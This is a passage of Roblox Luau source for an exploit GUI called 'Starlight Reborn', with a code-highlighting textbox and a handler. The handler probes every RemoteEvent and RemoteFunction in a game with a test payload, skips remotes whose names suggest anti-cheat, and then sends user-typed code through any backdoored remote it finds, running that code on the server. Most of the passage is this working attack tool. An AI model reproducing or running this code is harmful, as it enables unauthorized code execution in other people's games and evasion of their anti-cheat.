		return `<font color="rgb({r},{g},{b})">{text}</font>`
	end
	
	local function highlight(code)
		local result = ""
		local i = 1
		while i <= #code do
			if code:sub(i, i+1) == "--#" then
				local comment = code:sub(i):match("^%-%-[^\n]*")
				result ..= colored(comment, "comment")
				i += #comment
			elseif code:sub(i, i) == '"' or code:sub(i, i) == "'" then
				local quote = code:sub(i, i)
				local s, e = code:find(quote..".-"..quote, i)
				local str = s and code:sub(s, e) or quote
				result ..= colored(str, "string")
				i = s and e + 1 or i + 1
			elseif code:sub(i):match("^%d") then
				local num = code:sub(i):match("^%d+%.?%d*")
				result ..= colored(num, "number")
				i += #num
			elseif code:sub(i):match("^%a") then
				local word = code:sub(i):match("^[%a_][%w_]*")
				local kind = keywords[word]
				if kind then
					result ..= colored(word, kind)
				else
					result ..= word
				end
				i += #word
			elseif code:sub(i):match("^[%p]") then
				result ..= colored(code:sub(i,i), "operator")
				i += 1
			else
				result ..= code:sub(i, i)
				i += 1
			end
		end
		return result
	end
	
	local function sync()
		highlightlabel.Text = highlight(textbox.Text)
		highlightlabel.Size = textbox.Size
		highlightlabel.Position = textbox.Position
	end
	
	textbox:GetPropertyChangedSignal("Text"):Connect(sync)
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(sync)
	textbox:GetPropertyChangedSignal("Size"):Connect(sync)
	sync()
end;
task.spawn(C_1a);
--# StarterGui.Starlight Reborn.MainFrame.Handler
local function C_2d()
local script = STAR["2d"];
	local mainframe = script.Parent
	local textbox = mainframe.FastColoredTextbox.Scroll.TextBox
	local statusgrad = mainframe.Title.StatusIcon:FindFirstChild("UIGradient")
	
	local buttons = {
		attach = mainframe.Attach:FindFirstChildWhichIsA("TextButton"),
		execute = mainframe.Execute:FindFirstChildWhichIsA("TextButton"),
		clear = mainframe.Clear:FindFirstChildWhichIsA("TextButton"),
		exit = mainframe.Exit:FindFirstChildWhichIsA("TextButton"),
	}
	
	local blacklistedstrings = {"CheatDetected", "ExploitDetected", "MouseLock", "MouseLoc"}
	local holygrail = nil
	local safetime = 0.32
	local backdoored = false
	local scanned = false
	
	local function notify(desc, duration)
		pcall(function()
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "💫  Starlight Reborn 0.1.0",
				Text = tostring(desc),
				Duration = duration or 3
			})
			local sound = Instance.new("Sound", workspace)
			sound.SoundId = "rbxassetid://117409737658405"
			sound.Volume = 1
			sound.PlayOnRemove = true
			sound:Destroy()
		end)
	end
	
	local function fire(rem, code)
		if not rem then return end
		pcall(function()
			if rem:IsA("RemoteEvent") then
				rem:FireServer(code)
			elseif rem:IsA("RemoteFunction") then
				rem:InvokeServer(code)
			end
		end)
	end
	
	for _, g in pairs(mainframe:GetChildren()) do
		if g:IsA("Frame") or g:IsA("ImageLabel") or g:IsA("TextLabel") then
			g.Visible = false
		end
	end
	mainframe.Size = UDim2.new(0, 0, 0, 0)
	
	pcall(function()
		wait(1)
	
		mainframe:TweenSize(UDim2.new(0, 550,0, 350),"Out","Quad",1.25,false)
		wait(1.25)
		
		notify("Welcome to Starlight Reborn!",3)
		
		for _, g in pairs(mainframe:GetChildren()) do
			if g:IsA("Frame") or g:IsA("ImageLabel") or g:IsA("TextLabel") then
				g.Visible = true
			end
		end
	end)
	
	buttons.attach.MouseButton1Click:Connect(function()
		if scanned then
			notify("Scan already completed!", 3)
			return
		end
	
		local testpartname = "starlightreborn_" .. tostring(math.random(1000, 9999))
		local payload = [[
	            local i = Instance.new("Folder", game:GetService("Lighting"))
	            i.Name = "]]..testpartname..[["
	        ]]
	
		local function testremote(remote)
			if not remote then return false end
			fire(remote, payload)
			task.wait(safetime)
			return game:GetService("Lighting"):FindFirstChild(testpartname) ~= nil
		end
	
		for _, r in ipairs(game:GetDescendants()) do
			if not r.Parent then continue end
			if r.Parent.Name == "RobloxReplicatedStorage" 
				or r.Parent.Name == "DefaultChatSystemChatEvents" then continue end
	
			if (r:IsA("RemoteEvent") or r:IsA("RemoteFunction")) then
				local isblacklisted = false
				for _, str in ipairs(blacklistedstrings) do
					if string.find(r.Name:lower(), str:lower()) then
						isblacklisted = true
						break
					end
				end
	
				if not isblacklisted then
					print("Starlight Reborn | Testing: "..r.Name)
					if testremote(r) then
						holygrail = r
						backdoored = true
						break
					end
				end
			end
		end
	
		scanned = true
		buttons.attach.Interactable = false
	
		if backdoored and holygrail then
			notify("Found a backdoor: "..holygrail.Name, 5)
			print("Starlight Reborn | Found a backdoor: "..holygrail.Name)
			statusgrad.Color = ColorSequence.new(Color3.fromRGB(90, 255, 95), Color3.fromRGB(42, 135, 35))
		else
			notify("No backdoors were found :(", 5)
			print("Starlight Reborn | No backdoors were found :(")
		end
	end)
	
	buttons.execute.MouseButton1Click:Connect(function()
		if not backdoored or not holygrail then
			notify("No backdoor available! Run attach first.", 3)
			return
		end
		local code = textbox.Text
		if code ~= "" then
			fire(holygrail, code)
			notify("Code executed!", 3)
		else
			notify("No code to execute!", 3)
		end
	end)
	
	buttons.clear.MouseButton1Click:Connect(function()
		textbox.Text = ""
		notify("Textbox cleared!", 3)
	end)
	
	buttons.exit.MouseButton1Click:Connect(function()
		notify("Thanks for using Starlight!", 3)
		mainframe.Parent:Destroy()
	end)
end;
task.spawn(C_2d);

return STAR["1"], require;
